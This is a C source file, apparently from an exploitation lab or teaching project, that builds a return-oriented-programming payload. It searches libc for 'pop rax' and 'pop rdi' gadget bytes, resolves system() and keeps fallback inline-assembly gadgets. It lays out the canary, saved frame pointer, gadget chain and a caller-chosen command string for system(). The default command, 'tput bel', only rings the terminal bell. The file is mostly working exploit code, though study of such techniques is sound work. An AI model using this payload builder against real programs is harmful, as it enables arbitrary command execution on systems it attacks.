#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"
#include "strnstr.h"

static const char s_defargs[]  = "tput bel";

void initload(PayloadPtr plp) {
	memset(plp, 0, sizeof(*plp));
} // initload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
	size_t libc_size	= getpagesize() * 100; // Punt

        char s_libc_popRAX[]    = {0x58, 0xc3, 0};
        char s_libc_popRDI[]    = {0x5f, 0xc3, 0};

        Pointer libc_popRAX     = strnstr(baseAddressesPtr->libc_base, s_libc_popRAX, libc_size);
        Pointer libc_popRDI     = strnstr(baseAddressesPtr->libc_base, s_libc_popRDI, libc_size);

        Pointer libc_system     = dlsym(RTLD_NEXT, "system");

	// Offsets are relative to the payload
	baseAddressesPtr->buf_base = plp;

        // ROP chain for system(pl_arg)
        plp->pl_popRDI.o        = libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
        plp->pl_systemArg.o     = pointerToOffset(&plp->pl_arg, 'B', baseAddressesPtr);

        plp->pl_popRAX.o        = libc_popRAX?pointerToOffset(libc_popRAX, 'L', baseAddressesPtr):pointerToOffset(&&l_popRAX, 'P', baseAddressesPtr);
        plp->pl_zero            = 0;
        plp->pl_system.o        = pointerToOffset(libc_system, 'L', baseAddressesPtr);

	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
	int volatile v = 0;

        if (v) {
l_popRAX:        // Fallback gadget for "POP RAX"
                __asm__ ("pop %rax");
                __asm__ ("ret");
        } // if

	if (v) {
l_popRDI:	// Fallback gadget for "POP RDI"
		__asm__ ("pop %rdi");
		__asm__ ("ret");
	} // if

	// Get the argument to "system()" (if provided)
	if (p && np) {
		strncpy(plp->pl_arg, p, sizeof(plp->pl_arg) - 1);
		plp->pl_arg[sizeof(plp->pl_arg) - 1] = '\0';
		ssize_t nc = strnlen(plp->pl_arg, sizeof(plp->pl_arg) - 1);
		return nc;
	} // if

	// Fall-through to ring the bell
	strncpy(plp->pl_arg, "tput bel", sizeof(plp->pl_arg) - 1);
	return 0;
} // makeload()


static char *p8(void *s0) {
	static char d[sizeof(Pointer)];
	char *s = (char *) s0;

	assert(sizeof(d) == 8);
	for (int i = 0; i < sizeof(Pointer); i++)
		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];

	return d;
}

void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
	char fmt[] = "%20s: %018p (\"%.8s\")\n";

	fprintf(stderr, "--------------------------------------------\n");
	fprintf(stderr, fmt, "pl_dst.p",        plp->pl_dst.p,       p8(&plp->pl_dst));

	fprintf(stderr, fmt, "pl_canary.p",     plp->pl_canary.p,    p8(&plp->pl_canary));
	fprintf(stderr, fmt, "pl_rbp.p",        plp->pl_rbp.p,       p8(&plp->pl_rbp));

	fprintf(stderr, fmt, "pl_popRDI.p",     plp->pl_popRDI.p,    p8(&plp->pl_popRDI));
	fprintf(stderr, fmt, "pl_systemArg.p",  plp->pl_systemArg.p, p8(&plp->pl_systemArg));
	fprintf(stderr, fmt, "pl_popRAX.p",     plp->pl_popRAX.p,    p8(&plp->pl_popRAX));
	fprintf(stderr, fmt, "pl_zero",         plp->pl_zero,        p8(&plp->pl_zero));
	fprintf(stderr, fmt, "pl_system.p",     plp->pl_system.p,    p8(&plp->pl_system));

	fprintf(stderr, fmt, "pl_arg",          plp->pl_arg,         p8(&plp->pl_arg));
	fprintf(stderr, "--------------------------------------------\n");

} // dumpload()
